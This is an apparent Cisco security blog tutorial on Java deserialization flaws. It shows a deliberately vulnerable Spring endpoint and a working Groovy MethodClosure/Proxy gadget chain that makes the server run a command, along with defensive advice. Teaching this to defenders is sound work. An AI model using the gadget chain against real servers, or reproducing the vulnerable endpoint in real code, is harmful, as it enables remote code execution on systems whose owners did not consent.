# Remote Code Execution for Java Developers
If you want to go straight to code or prefer to read this in markdown, head to [our repo](https://github.com/Cisco-AMP/java_security).

This post is meant to be a gateway of sorts for Java developers into security.
Many topics and attacks in computer security rely on intimate knowledge of some unfamiliar technology (e.g. computer architecture, asm).
Therefore, it is sometimes a little overwhelming.
We will see that security bugs and exploits leading to remote code execution are possible with relatively simple Java code.

First, we will recap some relevant Java features (polymorphism, serialization and reflection).
Then we'll dive into a demo that demonstrates a particular Java security hole which uses these features.
Finally, we'll talk about lessons which can be applied to make your code more secure.

## Java Feature Review

### Polymorphism
Polymorphism or "One interface, many implementations" is a major feature of object-oriented programming languages.
Java supports this behavior with interfaces, abstract classes and concrete classes.

The `java.util.Map` interface is a good example to study.
This interface defines method signatures that a class needs to implement in order to be considered a `Map`.
The Java standard library includes a few implementations of this interface like `java.util.HashMap` or its threadsafe equivalent `java.util.concurrent.ConcurrentHashMap`.
Again, one interface, many implementations.

We could even make our own `Map` implementation.
```java
public class IntegerToStringMap implements Map<Integer,String> { ... }
```
If we find that `IntegerToStringMap` has functionality that we want to reuse then we can extend it to make more `Map` implementations.
```java
public class AnotherMap extends IntegerToStringMap { ... }
public class YetAnotherMap extends IntegerToStringMap { ... }
```

What if we wanted to prevent this?
Java allows you to specify that a concrete class should not be extended with the `final` keyword.
```java
public final class IntegerToStringMap implements Map<Integer,String> { ... }
```
This would stop `AnotherMap` and `YetAnotherMap` from being accepted by the Java compiler or JVM.

How about using polymorphic classes?
Continuing with the `Map` example, polymorphism in Java allows us to write code like this:
```java
void useMap(Map<Integer, String> m) { ... }

IntegerToStringMap map1 = new IntegerToStringMap();
HashMap<Integer, String> map2 = new HashMap<>();

useMap(map1);
useMap(map2);
```
This is particularly useful since we can write the `useMap` method without caring  which `Map` implementation is passed into the method.

### Serialization
Serialization is the act of taking data in a program and converting it to an array of bytes.
A program should then be able to recover the data through a reversal of the process (deserialization).
There are standard techniques to help since serialization is very common.
Java includes its own mechanism for serialization through the `java.io.Serializable` interface and the `java.io.ObjectOutputStream` and `java.io.ObjectInputStream` classes.

If you create a class that implements `Serializable` like this.
```java
public class Example implements Serializable {
    private Integer attribute;
    public Example(Integer attribute) { this.attribute = attribute; }
    public Integer getAttribute() { return attribute; }
}
```
It can be serializaed and deserialized like this.
```java
//serialization
Example example1 = new Example(1);
ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
new ObjectOutputStream(byteStream).writeObject(example1);
byte[] bytes = byteStream.toByteArray();

//deserialization
ObjectInputStream stream = new ObjectInputStream(new ByteArrayInputStream(bytes));
Example example2 = (Example) stream.readObject();
```

As long as class data fields (`private Integer attribute` in this case) also implement `Serialiazable` (`Integer` does), then serialization will succeed and be applied recursively to the data fields.

### Reflection
Reflection is probably the most difficult aspect of this tutorial.
It is a somewhat advanced feature that Java programmers do not usually need.
At Java One 2016, I remember Mark Reinhold and Alex Buckley asking a room of Java developers if they use the Java reflection API - an obvious majority kept their hands down.

Reflection is not needed in the demo for the server code a Java developer would write.
However, we will use reflection to create the exploit.

Reflection is a type of metaprogramming that lets you obtain information on and even modify parts of your program.
A simple use of reflection is annotation processing where you are obtaining information on your program.
Assume we have the following annotation definition and application to a class.
```java
@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.TYPE)
public @interface CustomAnnotation {
    public String value() default "";
}

@CustomAnnotation("Hello")
public class TestClass { ... }
```
You would then use code like this to extract the annotation value from `TestClass` at runtime.
```java
CustomAnnotation annotation = Scratch.class.getAnnotation(CustomAnnotation.class);
if (null != annotation){
    String annotationValue = annotation.value();
} 
```
In general, you can do some pretty funky things with the reflection API.
Another example, which we'll apply later, is implementing a interface at runtime.
Here is how you can implement a `java.util.Collection` with reflection.
```java
Collection dummyCollection = (Collection) Proxy.newProxyInstance(
       Main.class.getClassLoader(), new Class<?>[]{Collection.class}, 
       (proxy, method, args) -> {
           // perform custom actions for the method that was called
           return null;
       }
);
```
The lambda in the above snippet implements the `java.lang.reflect.InvocationHandler` interface.
It is code that will be called on every method invocation and it must decide how to handle each different method call.
Note that I'm asking for null pointer exceptions by returning `null` there.

## Remote Code Execution Demo

### Server Setup

This demo is built around a web server that accepts and deserializes a sumbission. 
The submission class isn't really anything special.
Here it is, `com.cisco.amp.server.Submission`, stripped of comments.
```java
public class Submission implements Serializable {
    private final Collection<String> values;
    public Submission(Collection<String> values) {
        this.values = values;
    }

    @Override
    public String toString() {
        StringBuilder sb = new StringBuilder();
        for (String entry : values) {
            sb.append(entry);
            sb.append("\n");
        }
        return sb.toString();
    }
}
```
It does implement `Serializable` though.
This allows the server to take bytes from an HTTP request and deserialize them to a `Submission` instance.
The `submit` method in `com.cisco.amp.server.SubmissionController` does this with the following code.
```java
@PostMapping("/submit")
public String submit(HttpServletRequest requestEntity) throws IOException, ClassNotFoundException {
    byte[] bytes = IOUtils.toByteArray(requestEntity.getInputStream());
    ObjectInputStream stream = new ObjectInputStream(new ByteArrayInputStream(bytes));
    Submission submission = (Submission) stream.readObject();
    return submission.toString();
}
```

There would probably be a bunch of other logic in a real application. 
This serves as a fairly realistic example though.
We deserialize the incoming bytes, do something with the object (call `toString` in this case) and return something back in the HTTP response.

However this small amount of server-side code is enough to introduce a vulnerability.
The sin we committed is not validating user input.
We take bytes that the user sends us and trust that they are what we expect them to be - a well-behaved instance of `Submission`.

### Exploit Development
We will develop a client that will craft and send an exploit to the server.
Our goal will be to make the server launch the calculator application.
This is a pretty classic example.
The idea is if you can get calculator to launch, then you could launch whatever other program you wanted to.
For example, launching some sort of remote shell application would be useful to an attacker.

By crafting a special submission (our exploit), we should be able to abuse the inherent trust that the server gives to submissions.
This is where polymorphism and reflection come into play.
We will be able to trick the the server into executing code we dictate by using these two concepts.

#### Polymorphic Exploit (Attempt)

First, notice that the `Submission` class has a `Collection<String>` member.
Since `Collection` is an interface, it is effectively saying that it doesn't care what type of `Collection` it is - any implementation will do.
This makes some sense since the result will be the same with `ArrayList<String>`, `HashSet<String>` and other normal implementations of `Collection`.
What if it isn't a normal collection implementation?
What if an attacker supplied a custom collection with the behavior they want?
That is exactly what we will try to do.

The rest of this post will use client code that looks like this (full source in [our repo](https://github.com/Cisco-AMP/java_security)).
```java
Submission submission = new Submission(makeExploitCollection());

ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
new ObjectOutputStream(byteArrayOutputStream).writeObject(submission);
byte[] bytes = byteArrayOutputStream.toByteArray();

HttpEntity<byte[]> entity = new HttpEntity<>(bytes);
RestTemplate restTemplate = new RestTemplate();
ResponseEntity<String> response = restTemplate.postForEntity("http://localhost:8080/submit", entity, String.class);
System.out.println(response.getBody());
```
That is, create a `Submission` instance, serialize it and send it to the server.
The interesting stuff, which we'll talk about now, is the contents of the `makeExploitCollection` method.

First we should note that the server will need to call whatever custom code we put into our exploit `Collection`.
In this case, a `Collection` method is called by the server that we can override.
Note that the server calls `Submission::toString` which looks like this.
```java
public String toString() {
    StringBuilder sb = new StringBuilder();
    for (String entry : values) {
        sb.append(entry);
        sb.append("\n");
    }
    return sb.toString();
}
```
The for-each syntax above, `for (String entry : values)`, calls `Collection::iterator` behind the scenes.
Therefore if we implement `Collection::iterator` with custom code, the server should run it.
This should be simple enough if we extend `ArrayList<String>` and override that one method.
Note that `ArrayList` implements `Serializable` so our extension will as well.
The following code should launch calculator when the server runs it.
```java
private static Collection<String> makeExploitCollection() {

    return new ArrayList<String>(){
        @Override
        public Iterator iterator() {
            try {
                Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
            } catch (IOException e) {
            }
            return null;
        }
    };
}
```

However, we hit a bit of a snag if we try to send this exploit to the server.
The server prints an exception with a stacktrace.
```java
java.lang.ClassNotFoundException: com.cisco.amp.client.Client$1
    ...
    at com.cisco.amp.server.SubmissionController.submit(SubmissionController.java:22) ~[classes!/:0.0.1-SNAPSHOT]
    ...
```

The name `com.cisco.amp.client.Client$1` was given to the anonymous class we created in out client.
This is the server saying that it can't find that class on the classpath.
Therefore the code we want the server to run wasn't available.
Here is the `String` rendering of the exploit we sent.
```text
ï¿½ï¿½ sr com.cisco.amp.server.Submission>ï¿½ï¿½1_Gï¿½ L valuest Ljava/util/Collection;xpsr com.cisco.amp.client.Client$1ï¿½wï¿½:-ï¿½ï¿½  xr java.util.ArrayListxï¿½ï¿½ï¿½ï¿½aï¿½ I sizexp    w    x
```
We can see the references to the classes we use, but the actual classes and code are not there.
In the next section, we'll see a way around this.

#### Polymorphic and Reflective Exploit
With our previous `Collection` implementation, the server wouldn't run the custom code we created.
This means that we can't send new code to the server.
We must only use code that is already on the server.
That is, we can only use classes that the server has on its classpath.
The challenge is creating a custom `Collection` implementation without requiring the server to execute code that it doesn't already have.
Reflection provides a solution here.

Going forward, we will assume that the following dependency is present in the server.
```xml
<dependency>
    <groupId>org.codehaus.groovy</groupId>
    <artifactId>groovy-all</artifactId>
    <version>2.4.0</version>
</dependency>
```
This is a little contrived, but not unreasonable considering that modern web apps are usually library soup.
Additionally, bringing the dependency in will make this section much simpler.

The idea here is to use reflection to implement our exploit `Collection` in a manner similar to the recap section.
Therefore, the exploit creation method will look something like this.
```java
private static Collection<String> makeExploitCollection() {

    Collection exploitCollection = (Collection) Proxy.newProxyInstance(
            Client.class.getClassLoader(), new Class<?>[]{Collection.class}, ?????InvocationHandler?????
    );

    return exploitCollection;
}
```
Here the `Collection` is reflectively implemented by `java.lang.reflect.Proxy`.
This should work because `Proxy` implements `Serializable`, and it will be on the server's classpath (all of the Java standard library is).
We still need an `InvocationHandler` implementation though.

Remember that we can't just make our own implementation of one.
We can only use code on the server for this exploit.
This is where the `groovy-all` dependency comes in.
It contains two very useful classes: `org.codehaus.groovy.runtime.ConvertedClosure` and `org.codehaus.groovy.runtime.MethodClosure`.
`ConvertedClosure` facilitates the reflective implementation of a class method with a `Closure` (like a Java lambda) you construct it with.
`MethodClosure` provides a `Closure` implementation for running a system command (like launching calculator).
They both implement `Serializable`.

Now, our reflective `Collection` implementation , with `Collection::iterator` overwritten, can constructed like this.
```java
private static Collection<String> makeExploitCollection() {

    MethodClosure methodClosure = new MethodClosure("/Applications/Calculator.app/Contents/MacOS/Calculator", "execute");
    ConvertedClosure iteratorHandler = new ConvertedClosure(methodClosure, "iterator");

    Collection exploitCollection = (Collection) Proxy.newProxyInstance(
            Client.class.getClassLoader(), new Class<?>[]{Collection.class}, iteratorHandler
    );

    return exploitCollection;
}
```
Note that we are not creating new code for the server to execute.
We are combining classes it already has.

All this is code given in [our repo](https://github.com/Cisco-AMP/java_security).
If you run the demo, the server will launch calculator.
When you run it, there is another exception printed to the server logs even though the exploit works.
We would need a higher quality exploit to avoid the exception printing if we cared about stealth.

### Server Code Improvements

We have seen the path to successfully exploit the demo server.
After going through an exercise like this, we can better understand what would have stopped or made the attack more difficult.
We'll go through some possible changes here and briefly describe how they could benefit the demo server.

#### Validate User Input
The big sin committed in the server code was not validating user input.
Generally, this isn't something that you want to do yourself.
Using a library or framework will give much better results as there will be edge cases that you don't think of.
However, in this scenario a couple things that might help are:
* Only accept one specific collection implementation.
* Ensure the `Collection` implementation and `Submission` are declared `final` in their class definitions.
* Don't use generics in the definition of concrete classes that will be serialized. We didn't see why in this exercise, but you might able to figure it out after reading about [Java type erasure](https://docs.oracle.com/javase/tutorial/java/generics/erasure.html).
* ***This list is not exhaustive by any means.***

These suggestions focus on preventing an attacker from supplying a class of their own design.
Input validation is an extremely important measure to take in general though.
Proper input validation can safe guard against common attacks (e.g. SQL injection). 

#### Avoid Java Serialization
This ties into validating user input.
Java Serialization is a really powerful serialization technique with many features.
It is often overkill and a more restrictive serialization method (e.g. JSON) would usually work just as well.
Using and validating against a more restrictive serialization standard gives an attacker less wiggle room.
In the demo, a JSON document containing an array would allow us to accept a collection of `Strings` in a much safer manner.

#### Better Manage Dependencies
In the demo, we used classes from `groovy-all` to craft our exploit.
This was an unnecessary dependency for our server, which means it should be removed.
Removing unnecessary dependencies gives an attacker less to work with.

If a dependency is needed, then it should be kept up to date.
Generally, the latest bug fix release will do, as long as the major version being used is still supported.
This also applies to the `groovy-all` dependency.
Newer versions contain safeguards so `ConvertedClosure` and `MethodClosure` can't be abused like in the demo.
You can read about the groovy safeguards [here](http://groovy-lang.org/security.html).

#### Use Minimal Permissions
If you run the demo and look at a process tree listing, then it will look something like this.
```text
mitch$ pstree -s "Calculator" | cat
...
\-+= 03193 mitch -bash
 \-+= 38085 mitch /usr/bin/java -jar ./target/server-0.0.1-SNAPSHOT.jar
   \--- 38105 mitch /Applications/Calculator.app/Contents/MacOS/Calculator
```
Calculator is launched by the server, and it is running as the same user the server runs as.
In this case, it is my personal account, so an attacker could do as much damage as I personally can.
If the server were running as root, the attacker could do more.
If the server had its own dedicated account, then the attacker would be able to do much less.